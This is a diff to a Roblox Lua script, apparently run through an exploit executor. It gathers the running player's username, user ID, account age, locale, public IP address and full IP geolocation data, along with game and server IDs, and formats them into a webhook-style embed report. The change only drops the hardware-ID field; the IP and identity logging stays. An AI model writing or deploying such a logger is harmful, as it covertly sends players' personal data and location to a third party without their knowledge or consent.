@@ -10,7 +10,6 @@ local Userid = game.Players.LocalPlayer.UserId -- UserId
 local Countiry = game.LocalizationService.RobloxLocaleId -- Country
 local GetIp = game:HttpGet("https://v4.ident.me/") -- Ip
 local GetData = game:HttpGet("http://ip-api.com/json")
-local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
 local AccountAge = LocalPlayer.AccountAge
 local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
 local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'
@@ -36,7 +35,7 @@ local data = {
       ["url"] = "https://roblox.com",
     },
         
-           ["description"] = "\n__[Player Info](https://www.roblox.com/users/"..Userid..")__".." **\nDisplay Name:** "..DName.." \n**Username:** " .. Name.." \n**User Id:** "..Userid.."\n**MembershipType:** "..MembershipType.."\n**AccountAge:** "..AccountAge.."\n**Country:** "..game.LocalizationService.RobloxLocaleId.."**\nIP:** "..GetIp.."**\nHwid:** "..GetHwid.."**\nDate:** "..tostring(os.date("%m/%d/%Y")).."**\nTime:** "..tostring(os.date("%X")).."\n\n__[Game Info](https://www.roblox.com/games/"..game.PlaceId..")__".."\n**Game:** "..GAMENAME.." \n**Game Id**: "..game.PlaceId.." \n**Exploit:** "..webhookcheck.."".."\n\n**Data:**".."```"..GetData.."```".. "\n\n**JobId:**".."```"..ConsoleJobId.."```" ,
+           ["description"] = "\n__[Player Info](https://www.roblox.com/users/"..Userid..")__".." **\nDisplay Name:** "..DName.." \n**Username:** " .. Name.." \n**User Id:** "..Userid.."\n**MembershipType:** "..MembershipType.."\n**AccountAge:** "..AccountAge.."\n**Country:** "..game.LocalizationService.RobloxLocaleId.."**\nIP:** "..GetIp .."**\nDate:** "..tostring(os.date("%m/%d/%Y")).."**\nTime:** "..tostring(os.date("%X")).."\n\n__[Game Info](https://www.roblox.com/games/"..game.PlaceId..")__".."\n**Game:** "..GAMENAME.." \n**Game Id**: "..game.PlaceId.." \n**Exploit:** "..webhookcheck.."".."\n\n**Data:**".."```"..GetData.."```".. "\n\n**JobId:**".."```"..ConsoleJobId.."```" ,
            ["type"] = "rich",
            ["color"] = tonumber(0xf2ff00),
    ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=150&height=150&format=png"},
